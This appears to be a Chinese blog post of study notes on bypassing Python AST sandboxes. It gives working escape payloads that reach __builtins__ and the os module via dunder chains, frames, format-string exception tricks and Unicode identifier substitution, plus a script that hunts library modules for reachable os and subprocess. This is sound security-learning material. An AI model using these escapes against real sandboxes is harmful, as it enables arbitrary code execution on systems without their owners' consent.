---
title: "Python AST 沙箱绕过"
modDatetime: 2025-01-20T00:00:00.000+08:00
description: "Python AST 节点限制、format 字符串与沙箱绕过技巧"
tags: ["python"]
---

学习
https://dummykitty.github.io/posts/pyjail-bypass-08-%E7%BB%95%E8%BF%87-AST-%E6%B2%99%E7%AE%B1/

https://xz.aliyun.com/news/12093

## 限制Name节点

希望获取`__builtins__`来绕过限制

### dunder attr

从允许的Name出发，用`__init__`等属性获取到危险方法，可以通过获取globals
`[].__class__.__mro__[-1].__subclasses__()[165].__init__.__globals__`
关键是找到一个python类的方法（比如warnings.catch_warnings的`__init__`）

比如如果能访问一个DataFrame的实例，就可以通过`df.__class__.__init__.__globals__`

如果能获取一个模块，可以通过`module.__dict__`获取模块内的全局变量、类等

### locals globals

前提是这些Name（globals，vars）被允许

```python
globals()['__builtins__']
locals()['__builtins__']
vars()['__builtins__'] # 相当于locals
```

### 其他获取builtins的方法

```python
(x for x in [1]).gi_frame.f_globals['__builtins__'] # 不涉及Name节点（除了x）

try:
    1/0
except Exception as e:
    print(e.__traceback__.tb_frame.f_globals['__builtins__'])

(lambda:0).__globals__['__builtins__'] # exec内部的globals

__loader__.get_data.__globals__['__builtins__']
```

## 获取属性的方法

```python
obj.attr
obj.__getattr__('attr_name')
obj.__getattribute__('attr_name')

getattr(obj, "attr_name")

cls.__dict__["__init__"] # 元数据
obj.__dict__['attr_name'] # 实例属性
obj.__getstate__() # 实例属性
mod.__dict__['__builtins__'] # 所有全局信息

type(e).__dict__['obj'].__get__(e, type(e)) # 通过类的__get__方法获取实例的属性， e.obj

vars(w)['attr'] # 相当于w.__dict__，不需要用到 .

match object:
    case object(__subclasses__=x):
        match x()[-1]: # object.__subclasses__[-1]
            case object(__init__=y):
                print(y) # <function T.__init__...

from operator import attrgetter; f = attrgetter("attr_name"); res = f(t)
import inspect; inspect.getmembers(obj)
from types import SimpleNamespace; SimpleNamespace({"k": "v"}).k # 把dict用dot访问

# 此外，format格式化字符串可以用于绕过
"{0.__globals__[os].popen._"+ "}".format(...)
```

禁用Name节点，或删除vars|globals等函数，再禁用dunder attr，暂时没办法

## Call节点白名单

eval模式，用海象表达式

```python
[min:=eval, min('print(1)')]
```

## 格式化字符串

f-string中的表达式依然会被AST解析到，但是字符串的format方法不会

```python
s = "{x.__cla" + "ss__}"
s.format(x=[])
```

不过这种方法只能读属性，不能执行函数
比如获取到eval函数，但实际上只是一个字符串表示，没法执行代码

### 配合Exception获取实际对象

通过在目标属性后面加一个不存在的对象，就会产生Error，从这个Error对象中获取目标属性的实际引用。帅呆

```python
def new_getattr(obj, attribute):
    fmt = "{0." + attribute + ".ribbit}"
    try:
        fmt.format(obj)
    except AttributeError as e:
        return e.obj

try:
    raise ValueError("pwn")
except Exception as e:
    tb = new_getattr(e, "__traceback__")
    frame = new_getattr(tb, "tb_frame")
    builtins_dict = new_getattr(frame, "f_builtins")

    imprt = builtins_dict["__import__"]

    import_globals = new_getattr(imprt, "__globals__")
    os = import_globals["os"]

    result = {
        "vulnerable": os
    }
    print(result)
```

## bypass

### unicode标识符替换

标识符可以用unicode代替（关键字不行）， 可以绕过基于字符串匹配的方法

```python
def replace(payload: str):
    dunder = "_＿"
    mapping = {
        'a': 'ª', 'b': 'ᵇ', 'c': 'ᶜ', 'd': 'ᵈ', 'e': 'ᵉ', 'f': 'ᶠ',
        'g': 'ᵍ', 'h': 'ʰ', 'i': 'ⁱ', 'j': 'ʲ', 'k': 'ᵏ', 'l': 'ˡ',
        'm': 'ᵐ', 'n': 'ⁿ', 'o': 'ᵒ', 'p': 'ᵖ', 'q': '𐞥', 'r': 'ʳ',
        's': 'ˢ', 't': 'ᵗ', 'u': 'ᵘ', 'v': 'ᵛ', 'w': 'ʷ', 'x': 'ˣ',
        'y': 'ʸ', 'z': 'ᶻ'
    }
    payload = payload.replace("__", dunder)

    trans_table = str.maketrans(mapping)
    return payload.translate(trans_table)
```

## 查找危险函数

```python
import types

from plotly import express as px
from plotly import graph_objects as go

seen = set()
target_names = {'os','_os','sys','_sys','importlib','argparse','subprocess','builtins','__builtins__'}
mods = {'px': px, 'go': go}

def walk(obj, path, depth):
    if depth < 0:
        return
    oid = id(obj)
    if oid in seen:

        return
    seen.add(oid)
    if isinstance(obj, types.ModuleType):
        keys = [k for k in obj.__dict__.keys() if k in target_names]
        if keys:
            print(path, '=>', keys)
    # recurse through modules/classes only via public-ish attrs or single underscore attrs
    names = []
    if isinstance(obj, types.ModuleType):
        names = [k for k,v in obj.__dict__.items() if (not k.startswith('__')) and isinstance(v, (types.ModuleType, type))]
    elif isinstance(obj, type):
        names = [k for k,v in obj.__dict__.items() if (not k.startswith('__')) and isinstance(v, (types.ModuleType, type))]
    for k in names:
        try:
            v = getattr(obj, k)
        except Exception:
            continue
        walk(v, path + '.' + k, depth-1)
for name, mod in mods.items():
    print('===', name)
    seen.clear()
    walk(mod, name, 4)
```
